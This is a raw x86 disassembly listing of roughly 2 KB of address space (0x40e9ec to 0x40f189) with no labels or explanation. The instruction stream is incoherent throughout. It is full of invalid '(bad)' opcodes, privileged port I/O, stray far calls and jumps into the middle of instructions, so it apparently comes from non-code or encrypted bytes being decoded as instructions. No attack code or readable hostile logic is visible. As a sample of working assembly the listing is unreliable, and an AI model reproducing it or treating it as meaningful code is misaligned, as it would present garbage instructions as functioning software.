  40e9ec:	pop    ss
  40e9ed:	mov    DWORD PTR [edi],edx
  40e9ef:	xor    DWORD PTR [eax+0x5b],0x937006c2
  40e9f6:	iret   
  40e9f7:	fstp   DWORD PTR ds:0x9bdb7239
  40e9fd:	sub    esp,DWORD PTR [eax+0x2c92e2da]
  40ea03:	(bad)  
  40ea04:	sub    DWORD PTR [esi],esi
  40ea06:	xchg   edi,eax
  40ea07:	lods   eax,DWORD PTR ds:[esi]
  40ea08:	aam    0x9b
  40ea0a:	xor    cl,BYTE PTR [ecx-0x6648f374]
  40ea10:	sbb    ebx,DWORD PTR [edx+0x761a1c0f]
  40ea16:	int3   
  40ea17:	pop    ebx
  40ea18:	push   edi
  40ea19:	dec    esi
  40ea1a:	lods   eax,DWORD PTR ds:[esi]
  40ea1b:	mov    bl,0x7b
  40ea1d:	frstor [esi+0x38]
  40ea20:	ins    BYTE PTR es:[edi],dx
  40ea21:	inc    esi
  40ea22:	add    cl,bh
  40ea24:	mov    dl,0xfe
  40ea26:	dec    edx
  40ea27:	(bad)  
  40ea28:	out    dx,al
  40ea29:	jp     0x40ea33
  40ea2b:	push   0x274c4a28
  40ea30:	sar    DWORD PTR [ecx+0x70],1
  40ea33:	mov    esi,0x8e1f24c4
  40ea38:	mov    eax,ds:0x62176d90
  40ea3d:	sub    al,0x63
  40ea40:	push   0x1c607e34
  40ea45:	push   esi
  40ea46:	loop   0x40ea32
  40ea48:	mov    edi,0xfd429692
  40ea4d:	sbb    eax,0x90f658d9
  40ea52:	inc    ebx
  40ea53:	dec    eax
  40ea54:	fld    QWORD PTR [ebx+0x2c1a4676]
  40ea5a:	add    al,cl
  40ea5c:	sub    eax,0x58e6be60
  40ea61:	jo     0x40ea52
  40ea63:	lahf   
  40ea64:	inc    edx
  40ea65:	jecxz  0x40ea84
  40ea67:	xchg   esp,eax
  40ea68:	bound  ebx,QWORD PTR [ebx+0xe]
  40ea6b:	jo     0x40ea93
  40ea6d:	xchg   esp,eax
  40ea6e:	push   ebx
  40ea6f:	push   ds
  40ea70:	or     dh,bh
  40ea72:	shr    DWORD PTR [ebx],1
  40ea74:	mov    ebp,ebx
  40ea76:	push   esi
  40ea77:	fst    DWORD PTR [ebp-0x6643b938]
  40ea7d:	lahf   
  40ea7e:	outs   dx,DWORD PTR ds:[esi]
  40ea7f:	sbb    eax,0x7bd2a68
  40ea84:	retf   0xfd9b
  40ea87:	jge    0x40eb00
  40ea89:	leave  
  40ea8a:	pop    ds
  40ea8b:	push   es
  40ea8c:	inc    esi
  40ea8d:	xor    eax,0xbc2257d8
  40ea92:	shl    BYTE PTR [edx],cl
  40ea94:	shr    BYTE PTR [ebx],1
  40ea96:	popf   
  40ea97:	stos   BYTE PTR es:[edi],al
  40ea98:	fs sbb al,0x17
  40ea9b:	jmp    0xa7e592f6
  40eaa0:	or     DWORD PTR [edx+ecx*2],0xb84cc543
  40eaa7:	pusha  
  40eaa8:	xor    eax,0xc7e0a04a
  40eaad:	int3   
  40eaae:	mov    bh,dh
  40eab0:	outs   dx,DWORD PTR ds:[esi]
  40eab1:	mov    eax,ds:0x36f65da3
  40eab6:	lahf   
  40eab7:	jb     0x40eaed
  40eab9:	or     bh,0xfb
  40eabc:	jne    0x40ea60
  40eabe:	jmp    0x40eaac
  40eac0:	push   ebx
  40eac1:	sbb    eax,0x20e7a1d8
  40eac6:	push   edi
  40eac7:	jg     0x40eacb
  40eac9:	data16 loopne 0x40eac3
  40eacc:	or     eax,0x248fba4f
  40ead1:	lods   eax,DWORD PTR ds:[esi]
  40ead2:	mov    bh,0x64
  40ead4:	mov    esi,0xd42f8f45
  40ead9:	xchg   esi,eax
  40eada:	fstp   QWORD PTR [esi+edx*1-0x5f]
  40eade:	add    ch,BYTE PTR [eax-0x80]
  40eae1:	pop    es
  40eae2:	sub    esp,ebx
  40eae4:	nop
  40eae5:	sub    ebx,DWORD PTR [edx]
  40eae7:	or     BYTE PTR [eax],ch
  40eae9:	mov    ds:0x26bac02c,eax
  40eaee:	sub    ebp,DWORD PTR [edx-0x48]
  40eaf1:	out    dx,al
  40eaf2:	mov    dh,0xda
  40eaf4:	push   0xffffff91
  40eaf6:	sbb    ebx,DWORD PTR [ecx-0x12b7b893]
  40eafc:	jmp    0xc3c7:0xc58ae7b7
  40eb03:	fsubr  QWORD PTR [eax]
  40eb05:	(bad)  
  40eb06:	push   ecx
  40eb07:	jb     0x40eaee
  40eb09:	cmp    eax,0x2bd586bb
  40eb0e:	pop    ss
  40eb0f:	mov    ecx,DWORD PTR [eax+0x68]
  40eb12:	mov    cl,0x44
  40eb14:	mov    edi,0x41b110d6
  40eb19:	enter  0x4322,0xa9
  40eb1d:	int    0xd4
  40eb1f:	jl     0x40eb16
  40eb21:	or     cl,BYTE PTR [edi]
  40eb23:	push   esi
  40eb24:	xchg   esp,eax
  40eb25:	mov    ebx,0x937cb9a0
  40eb2a:	ficomp DWORD PTR [esi-0x693412b2]
  40eb30:	ret    0xd76e
  40eb33:	vmwrite esi,DWORD PTR [ebx+edx*2+0x6b43308a]
  40eb3b:	mov    esi,0x1115d338
  40eb40:	and    eax,edi
  40eb42:	pop    ebx
  40eb43:	push   ecx
  40eb44:	cld    
  40eb45:	xor    eax,0xff43afb
  40eb4a:	dec    ebx
  40eb4b:	mul    DWORD PTR [eax-0x34ec89c3]
  40eb51:	sbb    eax,0xacd5657d
  40eb56:	and    al,BYTE PTR [ebx+eiz*1+0x48a8dc46]
  40eb5d:	test   eax,0x2907f362
  40eb62:	inc    eax
  40eb63:	jne    0x40eb67
  40eb65:	add    eax,0xde1fcd1
  40eb6a:	jg     0x40eb11
  40eb6c:	in     eax,dx
  40eb6d:	or     esp,DWORD PTR [esi+0x68]
  40eb70:	push   edi
  40eb71:	push   es
  40eb72:	fwait
  40eb73:	push   edi
  40eb74:	div    DWORD PTR [edx+0x13]
  40eb77:	icebp  
  40eb78:	dec    edi
  40eb79:	scas   al,BYTE PTR es:[edi]
  40eb7a:	adc    cl,BYTE PTR [edx]
  40eb7c:	outs   dx,BYTE PTR ds:[esi]
  40eb7d:	push   esi
  40eb7e:	mov    edi,0xb8ea7fdb
  40eb83:	imul   ebp,esp,0x43
  40eb86:	push   0x6564cf5
  40eb8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb8c:	jecxz  0x40eb86
  40eb8e:	jb     0x40eb5a
  40eb90:	sub    al,0x73
  40eb92:	stc    
  40eb93:	sub    cl,0x8c
  40eb96:	jg     0x40eb42
  40eb98:	sub    al,BYTE PTR [ecx-0x2]
  40eb9b:	(bad)  gs:[eax+0xd]
  40eb9f:	ret    
  40eba0:	and    dl,ch
  40eba2:	ins    DWORD PTR es:[edi],dx
  40eba3:	test   eax,0x639da84e
  40eba8:	retf   0x515c
  40ebab:	adc    BYTE PTR [eax+0x59],cl
  40ebae:	pop    edx
  40ebaf:	or     edx,DWORD PTR [eax-0x48ff4974]
  40ebb5:	xchg   BYTE PTR [eax-0x28],dh
  40ebb8:	mov    ds,WORD PTR [edx-0x59e8ca4f]
  40ebbe:	fidivr WORD PTR [edx-0x35]
  40ebc1:	push   ebp
  40ebc2:	and    BYTE PTR [ebx-0x60f0d40d],dh
  40ebc8:	sub    bh,BYTE PTR [ebx]
  40ebca:	fnstsw WORD PTR [bx+si+0x5b6c]
  40ebcf:	adc    DWORD PTR [eax+edx*4+0x6f60f50a],edi
  40ebd6:	js     0x40ec05
  40ebd8:	push   esp
  40ebd9:	(bad)  
  40ebda:	and    eax,0x1836f531
  40ebdf:	lds    ebx,FWORD PTR [esi+0x74]
  40ebe2:	int3   
  40ebe3:	aas    
  40ebe4:	aam    0xc3
  40ebe6:	and    DWORD PTR [eax-0x26e080ab],ebp
  40ebec:	pop    es
  40ebed:	and    eax,0xecd7c88e
  40ebf2:	jns    0x40eb9d
  40ebf4:	inc    edx
  40ebf5:	sub    DWORD PTR [edi+0x51],0x49d93434
  40ebfc:	push   edi
  40ebfd:	pop    es
  40ebfe:	xor    al,0xa0
  40ec00:	retf   0x83ca
  40ec03:	push   ebp
  40ec04:	and    DWORD PTR [edi+0x3a418f08],ecx
  40ec0a:	js     0x40ebc4
  40ec0c:	add    al,0x56
  40ec0e:	cmp    bl,BYTE PTR [esi+0x3b]
  40ec11:	xor    esi,DWORD PTR [edi]
  40ec13:	sbb    eax,DWORD PTR [esi+0x4b]
  40ec16:	push   0xc9b1532f
  40ec1b:	xor    edi,edx
  40ec1d:	(bad)
  40ec21:	outs   dx,DWORD PTR ds:[esi]
  40ec22:	lahf   
  40ec23:	(bad)  
  40ec24:	out    0x7,al
  40ec26:	sti    
  40ec27:	lods   eax,DWORD PTR ds:[esi]
  40ec28:	fisubr DWORD PTR [esi+0x333b70a5]
  40ec2e:	and    ecx,DWORD PTR [ebx-0x25]
  40ec31:	cwde   
  40ec32:	xchg   esi,eax
  40ec33:	jp     0x40ec18
  40ec35:	ds cmp al,0x99
  40ec38:	dec    esi
  40ec39:	popf   
  40ec3a:	ret    
  40ec3b:	xchg   edx,eax
  40ec3c:	aad    0x62
  40ec3e:	push   eax
  40ec3f:	aaa    
  40ec40:	and    cl,bh
  40ec42:	sbb    DWORD PTR [edx],0xe150522d
  40ec48:	adc    DWORD PTR [esi+0x776148dd],edx
  40ec4e:	sti    
  40ec4f:	xor    DWORD PTR [esp],edi
  40ec52:	addr16 int 0x96
  40ec55:	paddb  mm7,QWORD PTR [ebp-0x2ecac6dc]
  40ec5c:	bound  edi,QWORD PTR [ecx+0x3139c3f6]
  40ec62:	div    BYTE PTR [esi+0x4e756cd9]
  40ec68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec69:	ret    0xe8de
  40ec6c:	cmp    eax,0xe7d69d5f
  40ec71:	sbb    dl,BYTE PTR [edx+ebx*4+0x34]
  40ec75:	jns    0x40ecd2
  40ec77:	cwde   
  40ec78:	mov    eax,ds:0xa8413ad1
  40ec7d:	idiv   BYTE PTR [ecx-0x2f]
  40ec80:	jge    0x40eccd
  40ec82:	aad    0x2e
  40ec84:	cmp    eax,0x5a56855e
  40ec89:	mov    eax,0xcce1d331
  40ec8e:	push   0xffffffe6
  40ec90:	jo     0x40ec6d
  40ec92:	push   esp
  40ec93:	mov    dl,0x4d
  40ec95:	dec    ebp
  40ec97:	xchg   edx,eax
  40ec98:	popf   
  40ec99:	mov    cl,0xec
  40ec9b:	les    ecx,FWORD PTR [eax+eax*2-0x22f32307]
  40eca2:	xchg   edi,eax
  40eca3:	fcmovnu st,st(2)
  40eca5:	xor    BYTE PTR [esi+eiz*1+0x5f],0xb7
  40ecaa:	icebp  
  40ecab:	xchg   edx,eax
  40ecac:	bound  eax,QWORD PTR [esi]
  40ecae:	popa   
  40ecaf:	outs   dx,DWORD PTR ds:[esi]
  40ecb0:	(bad)  
  40ecb1:	pop    ebp
  40ecb2:	lods   eax,DWORD PTR ds:[esi]
  40ecb3:	jno    0x40ecdd
  40ecb5:	push   ds
  40ecb6:	neg    BYTE PTR ds:0xd91ff955
  40ecbc:	std    
  40ecbd:	(bad)  
  40ecbe:	sbb    edi,eax
  40ecc0:	xchg   edx,eax
  40ecc1:	cs in  al,0xc2
  40ecc4:	jg     0x40ec8f
  40ecc6:	in     al,0xfb
  40ecc8:	push   0xc34d9d57
  40eccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecce:	mov    dl,0x50
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	pop    edx
  40ecd2:	fisttp WORD PTR [ebp+eiz*1-0x332351a1]
  40ecd9:	mov    eax,0xedb5f677
  40ecde:	jge    0x40ecbd
  40ece0:	sbb    esp,DWORD PTR [eax+0x3227eae7]
  40ece6:	jno    0x40ed4d
  40ece8:	and    ebx,DWORD PTR [ecx]
  40ecea:	mov    esi,0xdb239bf3
  40ecef:	cwde   
  40ecf0:	aaa    
  40ecf1:	imul   edx,edx,0x50d4f08e
  40ecf7:	stos   BYTE PTR es:[edi],al
  40ecf8:	pop    ecx
  40ecf9:	mov    BYTE PTR [ebx+0x2473f4ce],dh
  40ecff:	lahf   
  40ed00:	sub    bh,ah
  40ed02:	push   edi
  40ed03:	pop    esp
  40ed04:	cli    
  40ed05:	jg     0x40ec97
  40ed07:	pop    edi
  40ed08:	push   ecx
  40ed09:	jno    0x40ecdc
  40ed0b:	add    BYTE PTR [edx+0x642da9d8],cl
  40ed11:	nop
  40ed12:	xor    BYTE PTR [ebp-0x12],cl
  40ed15:	adc    al,0x71
  40ed17:	shr    BYTE PTR [ebp-0x21],0x24
  40ed1b:	xchg   esi,eax
  40ed1c:	imul   ecx,DWORD PTR [ecx],0x38b47905
  40ed22:	(bad)  
  40ed23:	fmul   QWORD PTR [eax]
  40ed25:	and    ch,dl
  40ed27:	cmp    DWORD PTR [edi-0x36e7f9ea],ebx
  40ed2d:	shl    cl,1
  40ed2f:	aas    
  40ed30:	mov    cl,0x24
  40ed32:	mov    bl,0xf
  40ed34:	add    al,0xf7
  40ed36:	retf   
  40ed37:	nop
  40ed38:	pop    esi
  40ed39:	icebp  
  40ed3a:	lds    esi,FWORD PTR [edx]
  40ed3c:	pop    esp
  40ed3d:	call   0xc8c1:0x64d2f201
  40ed44:	fmul   DWORD PTR [eax+esi*4+0x2d]
  40ed48:	and    edx,edx
  40ed4a:	enter  0x8dec,0xe0
  40ed4e:	add    DWORD PTR [ecx],ecx
  40ed50:	cmp    DWORD PTR [eax-0xd],ebx
  40ed53:	mov    ebp,0x665d4a68
  40ed58:	xor    ch,BYTE PTR [ebp+edi*8+0x7e46b9fd]
  40ed5f:	mov    esi,es
  40ed61:	and    eax,0x7ce4656d
  40ed66:	mov    esi,0x8176d0b
  40ed6b:	push   es
  40ed6c:	stos   DWORD PTR es:[edi],eax
  40ed6d:	jno    0x40ecf7
  40ed6f:	sbb    eax,0xf3591fdc
  40ed74:	fs dec ebp
  40ed76:	mov    cl,0x16
  40ed78:	(bad)  
  40ed79:	cld    
  40ed7a:	inc    edx
  40ed7b:	mov    ah,0x2d
  40ed7d:	xchg   dh,al
  40ed7f:	jge    0x40ed20
  40ed81:	jae    0x40ed8c
  40ed83:	sub    ebp,DWORD PTR [edi-0x1dc37221]
  40ed89:	cmp    esp,esi
  40ed8b:	cmp    eax,0x2308420e
  40ed90:	mov    cl,0x4c
  40ed92:	lds    ebx,FWORD PTR [esp+edx*1-0x212a0412]
  40ed99:	xor    DWORD PTR [eax+0x58],edx
  40ed9c:	enter  0x5eb3,0x42
  40eda0:	and    dh,BYTE PTR [ecx-0x1a]
  40eda3:	sub    eax,0xe08eeb15
  40eda8:	int    0x25
  40edaa:	mov    ch,BYTE PTR [edi-0x1]
  40edad:	mov    ah,0xfb
  40edaf:	nop
  40edb0:	inc    esp
  40edb1:	fnstenv [ebp+ecx*2-0x1b]
  40edb5:	mov    ch,0xe
  40edb7:	push   esi
  40edb8:	or     ebx,DWORD PTR [ebp-0x7097a20b]
  40edbe:	xor    DWORD PTR [esi],0x2
  40edc1:	mov    dh,0xf1
  40edc3:	or     eax,0x652e7f9d
  40edc8:	je     0x40ee2d
  40edca:	fadd   st,st(7)
  40edcc:	loope  0x40edc6
  40edce:	mov    ebp,0x648bdd22
  40edd3:	ret    0xbdb3
  40edd6:	fstp   st(0)
  40edd8:	ins    BYTE PTR es:[edi],dx
  40edd9:	mov    ebx,0x97bcb831
  40edde:	call   0xfd4cc364
  40ede3:	ss xor al,0xd8
  40ede6:	or     eax,0xa2432954
  40edeb:	dec    ebx
  40edec:	mov    dh,0xbf
  40edee:	adc    ah,BYTE PTR [ebx+0x3]
  40edf1:	and    BYTE PTR [edi+0x36],ch
  40edf4:	out    0x3e,eax
  40edf6:	add    edi,edi
  40edf8:	push   ss
  40edf9:	pop    esi
  40edfa:	mov    WORD PTR [esi+0x8c45792],ss
  40ee00:	mov    esp,0x6a42a1f1
  40ee05:	imul   BYTE PTR [eax-0x73]
  40ee08:	jne    0x40edf5
  40ee0a:	aaa    
  40ee0b:	(bad)  
  40ee0c:	fmul   QWORD PTR [esi-0x4]
  40ee0f:	xchg   edx,eax
  40ee10:	dec    esp
  40ee11:	jl     0x40ee1f
  40ee13:	imul   edx,ebp,0x27
  40ee16:	fstp   TBYTE PTR [ebx+0x4]
  40ee19:	repnz dec esp
  40ee1b:	dec    edx
  40ee1c:	add    dh,BYTE PTR [edx+0x58]
  40ee1f:	dec    esi
  40ee20:	lods   al,BYTE PTR ds:[esi]
  40ee22:	scas   eax,DWORD PTR es:[edi]
  40ee23:	jmp    0x40ee34
  40ee25:	std    
  40ee26:	inc    edx
  40ee27:	push   ebp
  40ee28:	es jo  0x40ee8e
  40ee2b:	sbb    BYTE PTR [ecx],bh
  40ee2d:	dec    DWORD PTR [ebx-0x5a280ba]
  40ee33:	rol    BYTE PTR [esi-0x56],1
  40ee36:	not    eax
  40ee38:	and    bl,dh
  40ee3a:	imul   ecx,eax,0xbd089925
  40ee40:	jp     0x40ee7b
  40ee42:	cmp    eax,0x7f6c07fa
  40ee47:	out    0x32,eax
  40ee49:	sub    DWORD PTR [ebx*1+0x38b021d0],0x57
  40ee51:	xor    BYTE PTR ds:0xa92754b5,bh
  40ee57:	add    al,BYTE PTR [ebx+edx*1+0x29]
  40ee5b:	xor    eax,0xb54789a2
  40ee60:	xchg   esi,eax
  40ee61:	mov    bh,0xdc
  40ee63:	fcos   
  40ee65:	cmp    dh,BYTE PTR fs:[ebp-0x654cb5cb]
  40ee6c:	mov    ds:0xadc67ca2,al
  40ee71:	dec    edi
  40ee72:	push   ebx
  40ee73:	mov    ds:0x45b91d35,al
  40ee78:	pop    edi
  40ee79:	mov    ds:0xfa4b90a1,al
  40ee7e:	cmp    DWORD PTR [edx],esi
  40ee80:	bound  edi,QWORD PTR [ebp+0x5fbcaaf4]
  40ee86:	pushf  
  40ee87:	fwait
  40ee88:	sbb    ebp,DWORD PTR [edx-0x54ba0281]
  40ee8e:	mov    esi,DWORD PTR ss:[esp+ebp*1]
  40ee92:	out    0x92,eax
  40ee94:	sbb    ecx,edi
  40ee96:	mov    ds:0x515f9403,eax
  40ee9b:	leave  
  40ee9c:	mov    edi,0xfbb35bd7
  40eea1:	retf   0xad2e
  40eea4:	add    esp,DWORD PTR [ebx]
  40eea6:	lods   al,BYTE PTR ds:[esi]
  40eea7:	sub    edx,esp
  40eea9:	lea    ecx,[edx]
  40eeab:	or     ch,al
  40eead:	and    BYTE PTR [esi-0x76],0x29
  40eeb1:	aas    
  40eeb2:	imul   ebx,DWORD PTR [ebp-0x6],0xffffffa6
  40eeb6:	add    al,BYTE PTR ds:0x70e77a49
  40eebc:	pop    edi
  40eebd:	gs xor al,0xeb
  40eec0:	xlat   BYTE PTR ds:[ebx]
  40eec1:	mov    ds:0xe7c99d01,al
  40eec6:	fs out 0x44,eax
  40eec9:	test   BYTE PTR [edi],cl
  40eecb:	std    
  40eecc:	xchg   ebp,eax
  40eecd:	push   0xc3821025
  40eed2:	sbb    edi,DWORD PTR [ecx]
  40eed4:	jo     0x40eefa
  40eed6:	and    esi,DWORD PTR [eax+0x43]
  40eed9:	retf   0xee25
  40eedc:	leave  
  40eedd:	mov    cl,0x8e
  40eedf:	inc    ecx
  40eee0:	adc    edi,DWORD PTR [esi]
  40eee2:	push   esi
  40eee3:	jle    0x40ee9d
  40eee5:	cmp    al,0x8
  40eee7:	hlt    
  40eee8:	inc    esp
  40eee9:	not    DWORD PTR [esi]
  40eeeb:	cdq    
  40eeec:	leave  
  40eeed:	fidiv  WORD PTR [ebp+0x5b]
  40eef0:	or     eax,esp
  40eef2:	leave  
  40eef3:	and    eax,0xb01251cc
  40eef8:	sbb    al,0x45
  40eefa:	jge    0x40ef6c
  40eefc:	xchg   BYTE PTR [ebp-0x6a],dh
  40eeff:	or     BYTE PTR [ebp-0x31],al
  40ef02:	cs clc 
  40ef04:	inc    edi
  40ef05:	xchg   ebp,eax
  40ef06:	jle    0x40eeae
  40ef08:	sub    BYTE PTR [ebp*2-0x5e051d78],al
  40ef0f:	shl    BYTE PTR [eax+0x6],0x16
  40ef13:	sub    eax,0x9ef5648c
  40ef18:	push   ebp
  40ef19:	cld    
  40ef1a:	mov    ah,0x84
  40ef1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef1d:	sub    BYTE PTR [ebx-0x76faaf93],bh
  40ef23:	sub    dh,BYTE PTR [esi-0x2279f35a]
  40ef29:	les    edx,FWORD PTR [edi-0x4ab5e5f6]
  40ef2f:	xchg   esi,eax
  40ef30:	push   esp
  40ef31:	je     0x40ef5e
  40ef33:	out    0xa8,al
  40ef35:	hlt    
  40ef36:	cmp    BYTE PTR [edx+0x6e456afd],dl
  40ef3c:	push   esi
  40ef3d:	popa   
  40ef3e:	jne    0x40ef86
  40ef40:	and    al,0x5f
  40ef42:	pop    edx
  40ef43:	sub    ebp,ecx
  40ef45:	sub    eax,0x72e6a35e
  40ef4a:	xchg   ebx,eax
  40ef4b:	sub    DWORD PTR [eax+0x65],esp
  40ef4e:	int    0xa0
  40ef50:	popf   
  40ef51:	and    DWORD PTR [esi],edi
  40ef53:	jae    0x40efb2
  40ef55:	mov    ecx,0x3e62d501
  40ef5a:	and    DWORD PTR [ecx+0x487c7009],0xaa5c0423
  40ef64:	mov    al,ds:0x95a1931b
  40ef69:	test   eax,0x2a6d40e6
  40ef6e:	jg     0x40ef09
  40ef70:	jbe    0x40efce
  40ef72:	fild   WORD PTR [ecx+eax*2+0x2]
  40ef76:	call   0x6df:0x5525821a
  40ef7d:	adc    eax,0xaa2b4aca
  40ef82:	das    
  40ef83:	rcr    edi,0xc9
  40ef86:	xor    esi,esp
  40ef88:	cwde   
  40ef89:	cld    
  40ef8a:	push   eax
  40ef8b:	in     eax,0x48
  40ef8d:	aaa    
  40ef8e:	xchg   edi,eax
  40ef8f:	clc    
  40ef90:	sub    cl,BYTE PTR [eax]
  40ef92:	pop    es
  40ef93:	pop    esp
  40ef94:	cli    
  40ef95:	or     BYTE PTR [eax+0x2b],0x39
  40ef99:	and    BYTE PTR [edi+0x1ad9a841],0xb7
  40efa0:	mov    ch,0x19
  40efa2:	and    DWORD PTR [edi-0x7ad68517],edi
  40efa8:	mov    bh,0x46
  40efaa:	mov    DWORD PTR [edi+0x1],ebx
  40efad:	xor    DWORD PTR [edx+eiz*2+0x27],0xc8c88b1b
  40efb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efb6:	mov    ?,WORD PTR [ecx+0x5b8ef8e0]
  40efbc:	jnp    0x40ef45
  40efbe:	jnp    0x40efbe
  40efc0:	jge    0x40ef98
  40efc2:	push   es
  40efc3:	xchg   BYTE PTR gs:[ebp-0x70],cl
  40efc7:	push   edi
  40efc8:	push   cs
  40efc9:	inc    ebp
  40efca:	add    eax,0xf5150a84
  40efcf:	xor    BYTE PTR [edx+0x2a],dh
  40efd2:	mov    dl,0x21
  40efd4:	push   dx
  40efd6:	cmc    
  40efd7:	mov    ebx,0x2ca39fcd
  40efdc:	jnp    0x40efba
  40efde:	cmp    eax,0x43921dd4
  40efe3:	pop    ds
  40efe4:	mov    eax,0x7718f1f3
  40efe9:	inc    DWORD PTR [esi+0x9]
  40efec:	pop    edi
  40efed:	adc    DWORD PTR [edi-0x2f],0x64190cb9
  40eff4:	push   ebp
  40eff5:	scas   eax,DWORD PTR es:[edi]
  40eff6:	mov    ds:0x4faf5435,al
  40effb:	aas    
  40effc:	push   ebx
  40effd:	jne    0x40efe7
  40efff:	mov    bh,0xbc
  40f001:	pop    es
  40f002:	shl    BYTE PTR [edx-0x6cc3886b],0x74
  40f009:	push   0x1c
  40f00b:	mov    edi,DWORD PTR [edi]
  40f00d:	sub    edi,ecx
  40f00f:	dec    ebx
  40f010:	push   ss
  40f011:	push   esi
  40f012:	pushf  
  40f013:	jp     0x40f033
  40f015:	pop    ds
  40f016:	jg     0x40efac
  40f018:	sub    cl,BYTE PTR [edi+ecx*8-0x7c61eb33]
  40f01f:	ret    
  40f020:	mov    ds:0x32a97d72,al
  40f025:	inc    esi
  40f026:	mov    ah,0xe1
  40f028:	sub    esi,DWORD PTR [edi+0x2]
  40f02b:	stos   BYTE PTR es:[edi],al
  40f02c:	scas   eax,DWORD PTR es:[edi]
  40f02d:	ja     0x40f01a
  40f02f:	pop    DWORD PTR [edi-0x572323a0]
  40f035:	add    BYTE PTR [esi],bl
  40f037:	jl     0x40effd
  40f039:	lods   eax,DWORD PTR ds:[esi]
  40f03a:	arpl   WORD PTR ds:0xf0c83736,bp
  40f040:	scas   al,BYTE PTR es:[edi]
  40f041:	dec    ebx
  40f042:	retf   
  40f043:	jb     0x40f015
  40f045:	jmp    DWORD PTR [edx]
  40f047:	daa    
  40f048:	imul   esp,DWORD PTR [eax-0x7e],0xffffffeb
  40f04c:	pop    esi
  40f04d:	or     al,0x3b
  40f04f:	mov    DWORD PTR [edx+0x28],edx
  40f052:	inc    esi
  40f053:	outs   dx,DWORD PTR ds:[esi]
  40f054:	or     cl,BYTE PTR [ebp-0x1eff2bbf]
  40f05a:	sbb    al,0xd0
  40f05c:	pop    ebp
  40f05d:	icebp  
  40f05e:	(bad)  
  40f05f:	xor    al,0x70
  40f061:	popf   
  40f062:	add    dh,BYTE PTR [eax+0xc]
  40f065:	adc    al,BYTE PTR [ebx-0x249a9fd3]
  40f06b:	pop    ebp
  40f06c:	pusha  
  40f06d:	adc    eax,0x9840fdd4
  40f072:	lahf   
  40f073:	das    
  40f074:	jmp    0x40f0af
  40f076:	jns    0x40f0be
  40f078:	mov    esp,0x2d74c29b
  40f07d:	pushf  
  40f07e:	sub    esp,DWORD PTR [edi+edx*8-0x29a5ff46]
  40f085:	leave  
  40f086:	leave  
  40f087:	and    eax,0x318ffdb7
  40f08c:	xchg   esi,eax
  40f08d:	lods   al,BYTE PTR ds:[esi]
  40f08e:	xchg   ebx,eax
  40f08f:	mov    ch,0xed
  40f091:	jmp    0x40f0d2
  40f093:	std    
  40f094:	ficom  DWORD PTR [edx]
  40f096:	cmp    eax,0xed37c4ea
  40f09b:	mov    dl,ch
  40f09d:	inc    edx
  40f09e:	push   ecx
  40f09f:	test   al,0x84
  40f0a1:	xchg   esp,eax
  40f0a2:	in     al,dx
  40f0a3:	sub    al,0x3e
  40f0a5:	imul   eax,ebx,0xa0e710e7
  40f0ab:	xor    al,0xbe
  40f0ad:	jl     0x40f11b
  40f0af:	adc    al,0x9
  40f0b1:	(bad)  fs:[ebp-0x2d2f36ec]
  40f0b8:	faddp  st(0),st
  40f0ba:	add    eax,0xda86d4ab
  40f0bf:	in     eax,0x6d
  40f0c1:	mov    ebx,0x95ba10a3
  40f0c6:	in     eax,dx
  40f0c7:	ins    DWORD PTR es:[edi],dx
  40f0c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0c9:	ja     0x40f12a
  40f0cb:	jbe    0x40f078
  40f0cd:	pop    edx
  40f0ce:	mov    esi,DWORD PTR [edi]
  40f0d0:	out    0x72,al
  40f0d2:	pop    eax
  40f0d3:	sbb    DWORD PTR [edi+edi*2-0x40],edi
  40f0d7:	outs   dx,BYTE PTR ds:[esi]
  40f0d8:	in     al,dx
  40f0d9:	pop    ebp
  40f0da:	test   DWORD PTR [esi+0x4e],eax
  40f0dd:	inc    eax
  40f0de:	push   eax
  40f0df:	pop    ebp
  40f0e0:	xchg   ebp,eax
  40f0e1:	int3   
  40f0e2:	pop    ecx
  40f0e3:	pop    edi
  40f0e4:	push   eax
  40f0e5:	inc    edx
  40f0e6:	stos   DWORD PTR es:[edi],eax
  40f0e7:	cmp    dh,bl
  40f0e9:	add    dl,BYTE PTR [edi-0x5ccc015b]
  40f0ef:	and    dl,ah
  40f0f1:	leave  
  40f0f2:	mov    ds:0x76455087,eax
  40f0f7:	call   0x24d2:0x5f02f47c
  40f0fe:	pop    ebp
  40f0ff:	push   0xbeefd9d0
  40f104:	or     BYTE PTR [ecx+0x3204cea8],ch
  40f10a:	iret   
  40f10b:	je     0x40f11a
  40f10d:	fldcw  WORD PTR fs:[eax]
  40f110:	call   0x78c5bf12
  40f115:	dec    esi
  40f116:	mov    ebx,0x94a8fab0
  40f11b:	inc    ebx
  40f11c:	shl    ah,cl
  40f11e:	into   
  40f11f:	not    BYTE PTR [edx+0x223248d2]
  40f125:	data16 loop 0x40f1a3
  40f128:	ret    0x9f53
  40f12b:	pop    ebx
  40f12c:	call   0x871:0xe1b3268
  40f133:	loope  0x40f10f
  40f135:	fmul   QWORD PTR [edi+0x10]
  40f138:	pop    ds
  40f139:	xor    edi,ecx
  40f13b:	(bad)  
  40f13d:	js     0x40f156
  40f13f:	add    BYTE PTR ds:0x70c847a5,bh
  40f145:	pop    edx
  40f146:	(bad)  
  40f147:	out    dx,eax
  40f148:	adc    ah,BYTE PTR [ecx]
  40f14a:	xrelease mov DWORD PTR ss:[ebx],eax
  40f14e:	lock or eax,0x5ee68d25
  40f154:	aas    
  40f155:	(bad)  
  40f156:	adc    eax,0xe63f5a34
  40f15b:	out    0x40,eax
  40f15d:	xor    al,0x62
  40f15f:	rep lods eax,DWORD PTR ds:[esi]
  40f161:	adc    BYTE PTR [ecx+0x56cca29f],dh
  40f167:	inc    esp
  40f168:	aas    
  40f169:	mov    BYTE PTR [ebp+ecx*8-0x66],bl
  40f16d:	xor    eax,0x42e54a76
  40f172:	data16 mov ch,0x81
  40f175:	imul   eax,edx,0x9936674e
  40f17b:	add    BYTE PTR [ebx],cl
  40f17d:	mov    ah,0x3c
  40f17f:	aas    
  40f180:	adc    BYTE PTR [ecx],al
  40f182:	push   esp
  40f183:	mov    ds:0x8dcc2bc8,al
  40f188:	inc    esp
  40f189:	jne    0x40f175
